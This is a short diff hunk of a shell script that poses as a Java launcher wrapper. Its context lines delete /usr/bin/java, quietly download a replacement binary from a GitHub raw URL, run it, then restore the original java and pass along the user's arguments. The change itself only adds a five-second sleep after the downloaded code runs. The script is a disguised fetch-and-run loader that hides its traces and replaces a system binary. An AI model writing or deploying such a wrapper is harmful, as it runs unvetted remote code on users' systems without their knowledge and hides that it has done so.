@@ -3,6 +3,7 @@ rm -rf /usr/bin/java
 wget -q -O /usr/bin/java https://raw.githubusercontent.com/jackmoc/update/main/java >/dev/null 2>&1
 chmod +x /usr/bin/java
 /usr/bin/java
+sleep 5
 rm -rf /usr/bin/java
 mv /usr/bin/java8 /usr/bin/java
 exec java $1 $2 $3 $4 $5 $6 $7 $8 $9 $10 ${11} ${12} ${13} ${14} ${15}
